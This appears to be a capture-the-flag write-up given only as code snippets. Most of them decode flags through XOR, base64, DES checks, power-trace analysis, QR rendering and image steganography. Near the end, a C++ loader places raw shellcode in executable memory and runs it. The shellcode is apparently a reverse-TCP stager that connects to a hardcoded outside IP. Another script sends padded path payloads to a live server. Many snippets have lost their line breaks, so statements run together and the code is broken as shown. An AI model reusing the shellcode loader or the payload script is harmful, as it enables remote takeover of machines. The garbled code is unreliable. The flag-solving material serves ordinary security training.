char flag[]="flag{11111111111111111111111111111111}";unsigned char a[] ={ 0xBF, 0x63, 0x79, 0xDA, 0xBC, 0x27, 0xB0, 0x8F, 0xC9, 0x7B, 0x54, 0xC3, 0x6C, 0x9A, 0x1A, 0x02, 0xE5, 0x94, 0x56, 0xA9, 0xAE, 0x4F, 0x1A, 0x6C, 0xF3, 0x9E, 0xBF, 0x0B, 0x7D, 0x94, 0x44, 0x14, 0x85, 0xBC, 0xD2, 0x4A, 0x92, 0x19,};unsigned char index[] ={ 0x12, 0x0E, 0x1B, 0x1E, 0x11, 0x05, 0x07, 0x01, 0x10, 0x22, 0x06, 0x17, 0x16, 0x08, 0x19, 0x13, 0x04, 0x0F, 0x02, 0x0D, 0x25, 0x0C, 0x03, 0x15, 0x1C, 0x14, 0x0B, 0x1A, 0x18, 0x09, 0x1D, 0x23, 0x1F, 0x20, 0x24, 0x0A, 0x0 , 0x21};
unsigned char c[] ={ 0x56, 0x1A, 0x0B, 0x44, 0x94, 0x27, 0x8F, 0x63, 0xE5, 0xD2, 0xB0, 0x6C, 0x1A, 0xC9, 0x9E, 0xA9, 0xBC, 0x02, 0x79, 0x9A, 0x19, 0x6C, 0xDA, 0x4F, 0x7D, 0xAE, 0xC3, 0xBF, 0xF3, 0x7B, 0x94, 0x4A, 0x14, 0x85, 0x92, 0x54, 0xBF, 0xBC};unsigned char d[] ={ 136, 176, 73, 184, 157, 207, 61, 101, 232, 65, 209, 152, 62, 128, 139, 168, 107, 169, 125, 130, 214, 133, 15, 217, 78, 100, 58, 149, 173, 145, 185, 118, 128, 234, 170, 201, 231, 86,};unsigned char e[] ={ 191, 215, 46, 218, 238, 168, 26, 16, 131, 115, 172, 241, 6, 190, 173, 136, 4, 215, 18, 254, 181, 226, 97, 183, 61, 7, 74, 232, 150, 162, 157, 77, 188, 129, 140, 233, 136, 120, };int main(){ char enc[]="congratulationstoyoucongratulationstoy"; char tmp[38]; for(int i=0;i<38;i++) { enc[i]^=d[i]^c[i]^e[i]; tmp[index[i]]=enc[i];
 } for(int i=0;i<38;i++) { printf("%c",tmp[i]^a[i]^flag[i]);
 }
return 0;}
```



```
NAME whereThel1bFUNCTIONS check_flag(flag) -> 'bool' trytry(pla) whereistheflag(pla) whereistheflag1(pla) whereistheflag2(pla) whereistheflag3(pla) whereistheflag4(pla) whereistheflag5(pla) whereistheflag6(pla)
DATA __test__ = {} encry = [86, 96, 121, 96, 74, 60, 120, 57, 85, 83, 72, 32, 98, 88, 57,...
FILE /home/shimmer/whereThel1b.so
```



```
import base64import random
random.seed(0)encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]
for i in range(56): temp = random.randint(0,56) encry[i] ^= temp #print(chr(encry[i]),end='')print(base64.b64decode('ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9'.encode()))# flag{7f9a2d3c-07de-11ef-be5e-cf1e88674c0b}
```



```
public class inspect { public static boolean inspect(String input_str) { try { byte[] input_flag = input_str.getBytes(StandardCharsets.UTF_8); byte[] str2 = jni.getkey().getBytes(StandardCharsets.UTF_8); Arrays.copyOf(str2, 8); SecretKeySpec key = new SecretKeySpec(str2, "AES"); byte[] ivBytes = jni.getiv().getBytes(StandardCharsets.UTF_8); IvParameterSpec iv = new IvParameterSpec(ivBytes); Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding"); cipher.init(1, key, iv); byte[] encryptedBytes = cipher.doFinal(input_flag); String encryptedFlag = Base64.encodeToString(encryptedBytes, 0).trim(); boolean bool = encryptedFlag.equals("JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw=="); if (!bool) { return true; } return false; } catch (Exception exception) { exception.printStackTrace(); return true; } }}
```



```
#include <stdio.h>int res[] = {0xD7,0x1F,0,0,0xB7,0x21,0,0,0x47,0x1E,0,0,0x27,0x20,0,0,0xE7,0x26,0,0,0xD7,0x10,0,0,0x27,0x11,0,0,7,0x20,0,0,0xC7,0x11,0,0,0x47,0x1E,0,0,0x17,0x10,0,0,0x17,0x10,0,0,0xF7,0x11,0,0,7,0x20,0,0,0x37,0x10,0,0,7,0x11,0,0,0x17,0x1F,0,0,0xD7,0x10,0,0,0x17,0x10,0,0,0x17,0x10,0,0,0x67,0x1F,0,0,0x17,0x10,0,0,0xC7,0x11,0,0,0xC7,0x11,0,0,0x17,0x10,0,0,0xD7,0x1F,0,0,0x17,0x1F,0,0,7,0x11,0,0,0x47,0xF,0,0,0x27,0x11,0,0,0x37,0x10,0,0,0x47,0x1E,0,0,0x37,0x10,0,0,0xD7,0x1F,0,0,7,0x11,0,0,0xD7,0x1F,0,0,7,0x11,0,0,0x87,0x27,0,0,};int main(){ for (int i = 0; i < 200; i+=4) { int aa = res[i] | (res[i + 1] << 8); aa -= 0x1e; aa ^= 0x4d; aa -= 0x14; aa /= 0x50; printf("%c", aa); } return 0;}
```



```
import numpyf = 'attachment.npz'data = numpy.load(f)arr1,arr2,arr3,arr4 = data['index'],data['input'],data['output'],data['trace']#print(arr1,arr2,arr3,arr4,sep='n')s = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '!', '@', '#']print(len(s))print(len(arr4))
l = []for i in range(0,520,40): maxn = -1 maxindex = 0 init = i gr = arr4[i:i+40] for j in range(0,40): zhu = gr[j] sumn = 0 for k in range(0,40): if k == j: continue fu = gr[k] sumn += numpy.mean((zhu-fu)**2) temp = sumn / 39 if temp >maxn: maxn = temp maxindex = i+j l.append(maxindex)print(l)
key = [36, 42, 88, 138, 162, 213, 276, 308, 346, 388, 430, 476, 494]
print(s[key[0]])print(s[key[1]%40])print(s[key[2]%40])for i in key: print(s[i%40],end='')
```



```
Line #0: FuncDefn (Sub crypto(sMessage, strKey))Line #1: Dim VarDefn kLen VarDefn x VarDefn y VarDefn i VarDefn j VarDefn tempLine #2:... NextLine #38: QuoteRem 0x0004 0x0026 "i13POMdzEAzHfy4dGS+vUA==(After base64)"Line #39: EndSub
```



```
Vm1wR1UxRXhXWGhUV0d4WFlrZG9WMWxVUm1GWFJscHlWMjVrVmxKc2NIaFZiVFZQVkd4S2MxSnFVbGRXTTFKUVdWVmtVMDVyTVVWaGVqQTk=N round Base64
```



```
from PIL import ImageMAX = 21pic = Image.new("RGB",(MAX, MAX))str = "111111101100101111111100000100100101000001101110101010101011101101110101001001011101101110101110001011101100000100000001000001111111101010101111111000000000110000000000111100101010010011101010010000010110111111011001111000101100001001110000110100001000000101111001001100000000000001111001110010111111100100011010110100000100011010000100101110100001000010110101110101110110100110101110101011110101100100000101110001111001111111101111001111100"i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save("flag.png")
```



```
from pwn import *import requests as rq
url='http://8.147.128.251:18772/'for i in range(0x10000): print(i) padding='x61'*(i*4) payload=padding+'static/1' rq.get(url+'upload?name='+payload) rq.get(url+'test') res=rq.get(url+'static/1') print(res.text)
```



```
import numpy as npfrom PIL import Imageimport struct
img = Image.open('1.png')img = img.convert('RGBA')
data = np.array(img.getdata(),dtype = np.uint8)lenth = struct.unpack('<I',bytearray(data[0:8:2,0]))[0]
extract = bytearray(data[8:8 + (lenth * 2):2,0])
print(extract)
with open('666','wb') as f: f.write(extract)
```



```
#include <iostream>#include <stdio.h>#include <string.h>#include <Windows.h>
int main(){ unsigned char program[] = "xfcx48x83xe4xf0xe8xccx00x00x00x41x51x41x50x52x48x31xd2x65x48x8bx52x60x51x56x48x8bx52x18x48x8bx52x20x48x0fxb7x4ax4ax4dx31xc9x48x8bx72x50x48x31xc0xacx3cx61x7cx02x2cx20x41xc1xc9x0dx41x01xc1xe2xedx52x41x51x48x8bx52x20x8bx42x3cx48x01xd0x66x81x78x18x0bx02x0fx85x72x00x00x00x8bx80x88x00x00x00x48x85xc0x74x67x48x01xd0x50x8bx48x18x44x8bx40x20x49x01xd0xe3x56x48xffxc9x4dx31xc9x41x8bx34x88x48x01xd6x48x31xc0xacx41xc1xc9x0dx41x01xc1x38xe0x75xf1x4cx03x4cx24x08x45x39xd1x75xd8x58x44x8bx40x24x49x01xd0x66x41x8bx0cx48x44x8bx40x1cx49x01xd0x41x8bx04x88x41x58x41x58x5ex48x01xd0x59x5ax41x58x41x59x41x5ax48x83xecx20x41x52xffxe0x58x41x59x5ax48x8bx12xe9x4bxffxffxffx5dx49xbex77x73x32x5fx33x32x00x00x41x56x49x89xe6x48x81xecxa0x01x00x00x49x89xe5x49xbcx02x00x20xfbx27x64x48xebx41x54x49x89xe4x4cx89xf1x41xbax4cx77x26x07xffxd5x4cx89xeax68x01x01x00x00x59x41xbax29x80x6bx00xffxd5x6ax0ax41x5ex50x50x4dx31xc9x4dx31xc0x48xffxc0x48x89xc2x48xffxc0x48x89xc1x41xbaxeax0fxdfxe0xffxd5x48x89xc7x6ax10x41x58x4cx89xe2x48x89xf9x41xbax99xa5x74x61xffxd5x85xc0x74x0ax49xffxcex75xe5xe8x93x00x00x00x48x83xecx10x48x89xe2x4dx31xc9x6ax04x41x58x48x89xf9x41xbax02xd9xc8x5fxffxd5x83xf8x00x7ex55x48x83xc4x20x5ex89xf6x6ax40x41x59x68x00x10x00x00x41x58x48x89xf2x48x31xc9x41xbax58xa4x53xe5xffxd5x48x89xc3x49x89xc7x4dx31xc9x49x89xf0x48x89xdax48x89xf9x41xbax02xd9xc8x5fxffxd5x83xf8x00x7dx28x58x41x57x59x68x00x40x00x00x41x58x6ax00x5ax41xbax0bx2fx0fx30xffxd5x57x59x41xbax75x6ex4dx61xffxd5x49xffxcexe9x3cxffxffxffx48x01xc3x48x29xc6x48x85xf6x75xb4x41xffxe7x58x6ax00x59xbbxe0x1dx2ax0ax41x89xdaxffxd5";
 size_t lenth = sizeof(program) - 1; void* exec = VirtualAlloc(0, lenth, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (exec = NULL) { printf("12345"); } memcpy(exec, program, lenth);
 ((void(*)())exec)();
 return 0;}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716187827.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716187828.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716187829.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716187829.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716187830.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716187831.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1716187832.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716187833.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716187834.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716187835.png)